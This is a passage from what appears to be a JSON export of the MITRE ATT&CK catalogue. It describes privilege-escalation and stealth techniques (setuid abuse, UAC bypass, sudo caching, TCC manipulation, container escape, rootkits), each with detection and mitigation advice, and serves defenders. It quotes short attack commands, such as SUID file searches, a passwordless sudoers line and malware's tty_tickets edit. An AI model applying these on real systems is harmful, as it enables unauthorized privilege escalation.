risk posture and address issues where appropriate. <a href=\"https://github.com/hfiref0x/UACME\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github UACMe)</a>"},{"id":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk."},{"id":"M1052","name":"User Account Control","description":"Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL."}],"subTechniques":[{"id":"T1548.001","name":"Setuid and Setgid","description":"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. <a href=\"http://man7.org/linux/man-pages/man2/setuid.2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: setuid man page)</a> Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac Permissions). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2&gt;/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2&gt;/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries. <a href=\"https://gtfobins.github.io/#+suid\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFOBins Suid)</a>","detection":"Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","platforms":["Linux","macOS"],"dataSources":["Command: Command Execution","File: File Metadata","File: File Modification"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system."}]},{"id":"T1548.002","name":"Bypass User Account Control","description":"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. <a href=\"https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet How UAC Works)</a>\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. <a href=\"https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Inside UAC)</a> <a href=\"https://msdn.microsoft.com/en-us/library/ms679687.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN COM Elevation)</a> An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. <a href=\"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Davidson Windows)</a>\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods <a href=\"https://github.com/hfiref0x/UACME\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github UACMe)</a> that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. <a href=\"https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: enigma0x3 Fileless UAC Bypass)</a> <a href=\"https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Fareit)</a>\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity. <a href=\"http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS UAC Bypass)</a>","detection":"There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of Process Injection and unusual loaded DLLs through DLL Search Order Hijacking, which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key. <a href=\"https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: enigma0x3 Fileless UAC Bypass)</a>\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys. <a href=\"https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: enigma0x3 sdclt app paths)</a> <a href=\"https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: enigma0x3 sdclt bypass)</a>\n\nAnalysts should monitor these Registry settings for unauthorized changes.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: Process Creation","Process: Process Metadata"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Remove users from the local administrator group on systems."},{"id":"M1047","name":"Audit","description":"Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate. <a href=\"https://github.com/hfiref0x/UACME\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github UACMe)</a>"},{"id":"M1051","name":"Update Software","description":"Consider updating Windows to the latest version and patch level to utilize the latest protective measures against UAC bypass. <a href=\"https://github.com/hfiref0x/UACME\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github UACMe)</a>"},{"id":"M1052","name":"User Account Control","description":"Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL."}]},{"id":"T1548.003","name":"Sudo and Sudo Caching","description":"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" <a href=\"https://www.sudo.ws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sudo man page 2018)</a> Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>. <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX.Dok Malware)</a> Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' &gt;&gt; /etc/sudoers</code>. <a href=\"https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cybereason osx proton)</a> In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.","detection":"On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.","platforms":["Linux","macOS"],"dataSources":["File: File Modification","Command: Command Execution","Process: Process Creation","Process: Process Metadata"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."},{"id":"M1026","name":"Privileged Account Management","description":"By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the <code>timestamp_timeout</code> to 0 will require the user to input their password every time <code>sudo</code> is executed."},{"id":"M1028","name":"Operating System Configuration","description":"Ensuring that the <code>tty_tickets</code> setting is enabled will prevent this leakage across tty sessions."}]},{"id":"T1548.004","name":"Elevated Execution with Prompt","description":"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials. <a href=\"https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs AuthorizationExecuteWithPrivileges)</a> The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. <a href=\"https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Death by 1000 installers; it's all broken!)</a> <a href=\"https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Shlayer Feb 2019)</a> <a href=\"https://objective-see.com/blog/blog_0x2A.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Coldroot RAT)</a> This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code. <a href=\"https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Death by 1000 installers; it's all broken!)</a> <a href=\"https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Shlayer Feb 2019)</a> This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API. <a href=\"https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Death by 1000 installers; it's all broken!)</a>","detection":"Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.","platforms":["macOS"],"dataSources":["Process: Process Creation","Process: OS API Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"System settings can prevent applications from running that haven't been downloaded through the Apple Store which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."}]},{"id":"T1548.005","name":"Temporary Elevated Cloud Access","description":"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted. <a href=\"https://learn.microsoft.com/en-us/azure/azure-resource-manager/managed-applications/approve-just-in-time-access\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Just in Time Access 2023)</a>\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the <code>iam.serviceAccountTokenCreator</code> role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts. <a href=\"https://cloud.google.com/iam/docs/service-account-permissions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Service Account Authentication Roles)</a> <a href=\"https://www.hunters.security/en/blog/delefriend-a-newly-discovered-design-flaw-in-domain-wide-delegation-could-leave-google-workspace-vulnerable-for-takeover\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hunters Domain Wide Delegation Google Workspace 2023)</a> <a href=\"https://cloud.google.com/architecture/manage-just-in-time-privileged-access-to-project\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Just in Time Access 2023)</a> <a href=\"https://unit42.paloaltonetworks.com/critical-risk-in-google-workspace-delegation-feature/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023)</a> In Exchange Online, the <code>ApplicationImpersonation</code> role allows a service account to use the permissions associated with specified user accounts. <a href=\"https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Impersonation and EWS in Exchange)</a> \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the <code>PassRole</code> permission can allow a service they create to assume a given role, while in GCP, users with the <code>iam.serviceAccountUser</code> role can attach a service account to a resource. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS PassRole)</a> <a href=\"https://cloud.google.com/iam/docs/service-account-permissions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Service Account Authentication Roles)</a>\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended. <a href=\"https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Google Cloud Privilege Escalation)</a> <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a>\n\n<strong>Note:</strong> this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place. <a href=\"https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike StellarParticle January 2022)</a>","detection":"","platforms":["IaaS","Office Suite","Identity Provider"],"dataSources":["User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."}]},{"id":"T1548.006","name":"TCC Manipulation","description":"Adversaries can manipulate or abuse the Transparency, Consent, &amp; Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy &amp; Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (<code>tccd</code>) checks the TCC database, located at <code>/Library/Application Support/com.apple.TCC/TCC.db</code> (and <code>~/</code> equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again. <a href=\"https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: welivesecurity TCC)</a>\n\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through Process Injection or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious AppleScript. When executing under the Finder App, the malicious AppleScript inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and Launchctl. <a href=\"https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCC macOS bypass)</a> <a href=\"https://interpressecurity.com/resources/return-of-the-macos-tcc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCC Database)</a>","detection":"","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Modification","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"When using an MDM, ensure the permissions granted are specific to the requirements of the binary. Full Disk Access should be restricted to only necessary binaries in alignment with policy."},{"id":"M1026","name":"Privileged Account Management","description":"Remove unnecessary users from the local administrator group on systems."},{"id":"M1047","name":"Audit","description":"Routinely check applications using Automation under Security &amp; Privacy System Preferences. To reset permissions, user's can utilize the <code>tccutil reset</code> command. When using Mobile Device Management (MDM), review the list of enabled or disabled applications in the <code>MDMOverrides.plist</code> which overrides the TCC database. <a href=\"https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCC macOS bypass)</a>"}]}]},{"id":"T1611","name":"Escape to Host","description":"Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment. <a href=\"https://docs.docker.com/get-started/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Overview)</a>\n\nThere are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as <code>unshare</code> and <code>keyctl</code> to escalate privileges and steal secrets. <a href=\"https://docs.docker.com/storage/bind-mounts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Bind Mounts)</a> <a href=\"https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Privileged Container)</a> <a href=\"https://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Doki July 20)</a> <a href=\"https://0xn3va.gitbook.io/cheat-sheets/container/escaping\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Container Escape)</a> <a href=\"https://www.crowdstrike.com/blog/cve-2022-0185-kubernetes-container-escape-using-linux-kernel-exploit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Kubernetes Container Escape)</a> <a href=\"https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Keyctl-unmask)</a>\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as <code>docker.sock</code>, to break out of the container via a Container Administration Command. <a href=\"https://0xn3va.gitbook.io/cheat-sheets/container/escaping\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Container Escape)</a> Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine. <a href=\"https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Server Containers Are Open)</a>\n\nIn ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor. <a href=\"https://github.com/vmware/vcf-security-and-compliance-guidelines/tree/main/security-advisories/vmsa-2025-0004\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom VMSA-2025-004)</a>\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.","detection":"Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.","platforms":["Windows","Linux","Containers","ESXi"],"dataSources":["Process: Process Creation","Kernel: Kernel Module Load","Container: Container Creation","Volume: Volume Modification","Process: OS API Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default and do not use unnecessary privileges or mounted components. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Use read-only containers, read-only file systems, and minimal images when possible to prevent the running of commands. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a> Where possible, also consider using application control and software restriction tools (such as those provided by SELinux) to restrict access to files, processes, and system calls in containers. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Security Context)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary tools and software from containers."},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Consider utilizing seccomp, seccomp-bpf, or a similar solution that restricts certain system calls such as mount. In Kubernetes environments, consider defining Pod Security Standards that limit container access to host process namespaces, the host network, and the host file system. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"},{"id":"M1051","name":"Update Software","description":"Ensure that hosts are kept up-to-date with security patches."}],"subTechniques":[]}]},{"tactic":"Stealth","techniques":[{"id":"T1006","name":"Direct Volume Access","description":"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. <a href=\"http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hakobyan 2009)</a>\n\nUtilities, such as <code>NinjaCopy</code>, exist to perform these actions in PowerShell. <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github PowerSploit Ninjacopy)</a> Adversaries may also use built-in or third-party utilities (such as <code>vssadmin</code>, <code>wbadmin</code>, and esentutl) to create shadow copies or backups of data from system volumes. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Esentutl/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Esentutl)</a>","detection":"Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github PowerSploit Ninjacopy)</a>\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through PowerShell, additional logging of PowerShell scripts is recommended.","platforms":["Network Devices","Windows"],"dataSources":["File: File Creation","Drive: Drive Access","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure only accounts required to configure and manage backups have the privileges to do so. Monitor these accounts for unauthorized backup activity."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of behaviors related to efforts by an adversary to create backups, such as command execution or preventing API calls to backup related services."}],"subTechniques":[]},{"id":"T1014","name":"Rootkit","description":"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. <a href=\"https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Windows Rootkits)</a> \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor or System Firmware. <a href=\"https://en.wikipedia.org/wiki/Rootkit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Rootkit)</a> Rootkits have been seen for Windows, Linux, and Mac OS X systems. <a href=\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Linux Rootkit)</a> <a href=\"http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Mac OSX Rootkit)</a>\n\nRootkits that reside or modify boot sectors are known as Bootkits and specifically target the boot process of the operating system.","detection":"Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. <a href=\"https://en.wikipedia.org/wiki/Rootkit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Rootkit)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Drive: Drive Modification","Firmware: Firmware Modification","File: File Modification"],"mitigations":[],"subTechniques":[]},{"id":"T1027","name":"Obfuscated Files or Information","description":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or 